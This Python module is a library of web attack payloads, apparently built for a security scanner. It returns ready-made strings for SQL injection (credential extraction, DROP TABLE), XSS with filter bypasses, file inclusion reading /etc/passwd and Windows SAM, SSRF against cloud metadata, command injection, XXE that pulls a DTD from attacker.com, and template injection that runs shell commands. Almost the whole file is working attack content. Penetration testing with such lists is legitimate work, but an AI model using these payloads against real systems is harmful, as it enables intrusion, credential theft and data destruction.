"""Extended Payload Database"""
from typing import Dict, List


class AdvancedPayloads:
    """Comprehensive payload library for security testing"""
    
    @staticmethod
    def sqli_advanced() -> List[str]:
        """Advanced SQL injection payloads"""
        return [
            # Auth bypass
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "admin'--", "admin' #", "') OR ('1'='1", "1' OR '1'='1",
            
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            
            # Blind SQLi
            "1' AND 1=1--", "1' AND 1=2--", "1' AND SUBSTRING(@@version,1,1)='5'--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            
            # Time-based
            "1'; WAITFOR DELAY '0:0:5'--", "1'; SELECT SLEEP(5)--",
            "1'; pg_sleep(5)--", "1' AND BENCHMARK(5000000,SHA1('test'))--",
            
            # Error-based
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "1' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
            
            # Stacked queries
            "1'; DROP TABLE users--", "1'; INSERT INTO users VALUES('hacked')--",
            
            # Filter bypass
            "' oR '1'='1", "' Or/**/'1'='1", "'%20OR%20'1'='1",
            "' /*!OR*/ '1'='1", "'%00OR'1'='1"
        ]
    
    @staticmethod
    def xss_advanced() -> List[str]:
        """Advanced XSS payloads with bypass techniques"""
        return [
            # Basic
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "<body onload=alert(1)>",
            
            # Filter bypass
            "<ScRiPt>alert(1)</sCrIpT>", "<SCRIPT>alert(1)</SCRIPT>",
            "<img/src=x/onerror=alert(1)>", "<svg\\x0aonload=alert(1)>",
            
            # Encoding
            "<script>alert\\x281\\x29</script>",
            "<img src=x onerror=\"\\u0061lert(1)\">",
            "<svg onload=\"alert&#40;1&#41;\">",
            
            # No parentheses
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)//",
            "<script>top['al'+'ert'](1)</script>",
            
            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onfocus=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            
            # Protocol handlers
            "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            # Template injection chain
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}", "#{alert(1)}"
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        """Local File Inclusion payloads"""
        return [
            # Linux
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd", "..%252f..%252f..%252fetc/passwd",
            
            # Windows
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\win.ini",
            
            # Log poisoning sources
            "/var/log/apache2/access.log", "/var/log/nginx/access.log",
            "/var/log/auth.log", "/proc/self/environ",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input", "expect://id",
            
            # Null byte
            "../../../etc/passwd%00", "../../../etc/passwd%00.jpg"
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[str]:
        """SSRF payloads for internal access"""
        return [
            # Localhost variants
            "http://127.0.0.1", "http://localhost", "http://[::1]",
            "http://0x7f000001", "http://2130706433", "http://0177.0.0.1",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            
            # Internal services
            "http://127.0.0.1:22", "http://127.0.0.1:3306",
            "http://127.0.0.1:6379", "http://127.0.0.1:11211",
            
            # Protocol handlers
            "file:///etc/passwd", "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:70", "ldap://localhost:389/"
        ]
    
    @staticmethod
    def cmd_injection() -> List[str]:
        """Command injection payloads"""
        return [
            # Unix
            "; id", "| id", "&& id", "$(id)", "`id`",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; whoami", "$(whoami)",
            
            # Blind
            "; sleep 5", "| sleep 5", "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            
            # Windows
            "| whoami", "& whoami", "^& whoami",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| dir C:\\",
            
            # Bypass
            ";{ id; }", "| { id; }", "|| id ||"
        ]
    
    @staticmethod
    def xxe_payloads() -> List[str]:
        """XXE payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>'
        ]
    
    @staticmethod
    def ssti_payloads() -> List[str]:
        """Server-Side Template Injection payloads"""
        return [
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{config}}", "{{self}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}"
        ]
    
    @staticmethod
    def get_all_categories() -> Dict[str, List[str]]:
        """Get all payload categories"""
        return {
            'sqli': AdvancedPayloads.sqli_advanced(),
            'xss': AdvancedPayloads.xss_advanced(),
            'lfi': AdvancedPayloads.lfi_payloads(),
            'ssrf': AdvancedPayloads.ssrf_payloads(),
            'cmdi': AdvancedPayloads.cmd_injection(),
            'xxe': AdvancedPayloads.xxe_payloads(),
            'ssti': AdvancedPayloads.ssti_payloads()
        }
